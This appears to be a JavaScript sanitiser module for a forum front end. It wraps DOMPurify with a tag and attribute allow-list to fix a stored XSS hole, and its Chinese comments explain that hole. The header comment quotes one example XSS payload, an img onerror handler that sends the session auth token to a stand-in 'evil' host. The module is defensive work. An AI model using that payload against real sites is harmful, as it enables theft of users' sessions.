import DOMPurify from 'dompurify';

/**
 * 富文本净化（第 91 批）
 * ------------------------------------------------------------------
 * 背景：**存储型 XSS**。论坛帖子正文、评论、回复都是用户自己写的内容，
 * 而 PostDetailView 直接把它们塞进 `v-html`（模板 88 / 247 / 379 行），
 * 中间只有一个 `\n → <br>` 的替换 —— 没有任何净化。于是：
 *
 *     发帖内容 = `<img src=x onerror="fetch('//evil/'+sessionStorage.auth_token)">`
 *
 * 任何打开这条帖子的人都会执行它；而本项目的 token 存在 sessionStorage 里，
 * 正好是这行脚本要读的东西。
 *
 * 项目里其实**早就有 DOMPurify**（`utils/markdown.js:58` 做 Markdown 渲染时一直在用），
 * 只是"帖子 / 评论 / 审核预览 / 新闻正文"这几条 `v-html` 链路漏了。这里补一个
 * 共用入口，避免以后再各写一份、又漏一个地方。
 *
 * 为什么不改后端：帖子正文是**富文本**，后端存的是带格式的 HTML，
 * 在服务端转义会把所有人的历史正文格式全部破坏；净化必须发生在"渲染成 DOM"这一步。
 */

/**
 * 允许的标签/属性：覆盖项目里实际用到的富文本能力
 * （段落 / 标题 / 列表 / 引用 / 代码 / 表格 / 图片 / 链接 / 简单的 div-span 排版）。
 * 不在白名单里的一律丢弃 —— 包括 `<script>`、`<iframe>`、`<img onerror=...>` 这类。
 */
const RICH_TEXT_CONFIG = {
  ALLOWED_TAGS: [
    'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
    'p', 'br', 'hr', 'pre', 'code',
    'blockquote', 'ol', 'ul', 'li', 'dl', 'dt', 'dd',
    'strong', 'b', 'em', 'i', 'u', 's', 'del', 'ins', 'mark', 'sub', 'sup', 'small',
    'a', 'img',
    'table', 'thead', 'tbody', 'tr', 'th', 'td',
    'div', 'span', 'section', 'article', 'figure', 'figcaption',
  ],
  ALLOWED_ATTR: [
    'class', 'id', 'style', 'src', 'alt', 'title', 'href', 'target', 'rel',
    'width', 'height', 'loading', 'colspan', 'rowspan', 'align',
  ],
  // 强制给外链补 rel="noopener noreferrer"，避免 target="_blank" 被反向利用
  ADD_ATTR: ['target', 'rel'],
  ALLOW_DATA_ATTR: false,
  // 内容里出现 <style>/<link> 时不保留（样式注入同样属于注入）
  FORBID_TAGS: ['style', 'link', 'meta', 'iframe', 'object', 'embed', 'form', 'input', 'button'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'srcdoc', 'formaction'],
};

if (DOMPurify.isSupported && typeof DOMPurify.addHook === 'function') {
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.tagName === 'A' && node.getAttribute('target')) {
      node.setAttribute('rel', 'noopener noreferrer');
    }
  });
}

/**
 * 净化一段富文本 HTML，供 `v-html` 使用。
 *
 * @param {unknown} html 原始 HTML（非字符串或空值时返回 ''，不会渲染出 "null" 字样）
 * @returns {string} 净化后的 HTML
 */
export function sanitizeRichText(html) {
  if (typeof html !== 'string' || html === '') return '';
  return DOMPurify.sanitize(html, RICH_TEXT_CONFIG);
}

export default sanitizeRichText;
